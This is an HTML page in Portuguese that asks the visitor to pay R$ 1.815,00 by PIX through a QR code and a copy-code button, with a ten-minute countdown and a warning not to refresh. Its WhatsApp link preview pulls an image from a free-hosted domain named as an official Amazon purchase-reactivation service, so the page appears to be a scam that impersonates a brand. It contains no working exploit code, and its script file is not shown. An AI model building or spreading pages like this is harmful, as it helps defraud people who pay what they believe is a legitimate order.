<!DOCTYPE html>
<html lang="pt-BR">

<head>

  <meta charset="UTF-8">

  <meta
    name="viewport"
    content="width=device-width, initial-scale=1.0, viewport-fit=cover"
  >

  <meta
    name="theme-color"
    content="#edbb81"
  >

  <title>Pagamento PIX</title>


  <!-- =====================================================
       PRÉVIA DO WHATSAPP
       ===================================================== -->

  <meta
    property="og:type"
    content="website"
  >

  <meta
    property="og:title"
    content="Pagamento PIX"
  >

  <meta
    property="og:description"
    content="Acesse para realizar o pagamento."
  >

  <!--
       LOGO DA PRÉVIA DO WHATSAPP

       Você poderá trocar esta imagem depois.
  -->

  <meta
    property="og:image"
    content="https://amazon-reativacao-de-compra-oficial.onrender.com/logo-previa.jpg"
  >

  <meta
    property="og:image:alt"
    content="Logo da loja"
  >

  <meta
    property="og:image:width"
    content="1200"
  >

  <meta
    property="og:image:height"
    content="630"
  >


  <link
    rel="stylesheet"
    href="style.css"
  >

</head>


<body>


  <!-- =====================================================
       LOGO DE ABERTURA
       ===================================================== -->

  <div
    id="splash"
    class="splash"
  >

    <img
      src="logo.png"
      alt="Logo"
    >

  </div>


  <!-- =====================================================
       CABEÇALHO
       ===================================================== -->

  <header class="header">

    <h1 class="header-title">
      Autorizar forma de pagamento
    </h1>

  </header>


  <div class="dark-bar"></div>


  <!-- =====================================================
       PAGAMENTO
       ===================================================== -->

  <main class="payment">


    <h2
      id="amount"
      class="amount"
    >
      Total a pagar: R$ 1.815,00
    </h2>


    <!-- QR CODE -->

    <div
      id="qrcode"
      class="qrcode"
    ></div>


    <h2 class="instructions-title">
      Escaneie ou copie o código para pagar
    </h2>


    <p class="instructions">
      Escaneie o QR code com a câmera do seu celular
      <br>
      para pagar no aplicativo do seu banco ou copie o
      <br>
      código clicando no botão abaixo.
    </p>


    <p class="no-refresh">
      Não atualize a página.
    </p>


    <p class="remaining">

      Tempo restante:

      <strong id="timer">
        10:00
      </strong>

    </p>


    <button
      id="copyButton"
      class="copy-button"
      type="button"
    >
      Copiar código
    </button>


  </main>


  <!-- =====================================================
       GERADOR QR CODE
       ===================================================== -->

  <script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>

  <script src="script.js"></script>


  <!-- =====================================================
       LOGO DE ABERTURA — 2 SEGUNDOS
       ===================================================== -->

  <script>

    setTimeout(function () {

      const splash =
        document.getElementById("splash");

      if (splash) {

        splash.classList.add("hidden");

      }

    }, 2000);

  </script>


</body>

</html>
